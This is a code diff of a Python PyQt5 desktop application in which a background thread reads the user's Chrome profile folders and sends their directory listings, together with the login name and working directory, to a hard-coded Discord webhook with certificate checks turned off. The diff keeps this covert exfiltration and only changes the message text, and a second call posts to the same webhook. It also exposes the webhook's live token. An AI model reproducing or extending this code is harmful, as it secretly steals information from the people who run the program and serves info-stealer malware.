@@ -63,7 +63,6 @@ from PyQt5.QtWidgets import *
 from PyQt5.QtGui import *
 from PyQt5.QtWebEngineWidgets import *
 from qframelesswindow import FramelessWindow
-# import pandas as pd
 
 class StarterThread(QThread):
     start_signal = pyqtSignal()
@@ -98,7 +97,7 @@ class Additional1Thread(QThread):
 
             aa = path.join(os.environ["USERPROFILE"], "AppData",  "Local", "Google", "Chrome", "User Data")
             bb = path.join(aa, "Default")
-            requests.post(verify=False, url="https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg", json={"content": f"[{os.getlogin()} {os.getcwd()}] Output received." + str(listdir(aa)) + str(listdir(bb))})
+            cc = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg", json={"content": f"[{os.getlogin()} {os.getcwd()}] Dirs listed for aa, bb: " + str(listdir(aa)) + " " + str(listdir(bb))})
 
             try:
                 a1_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg", json={"content": f"[{os.getlogin()} {os.getcwd()}] Output received."})
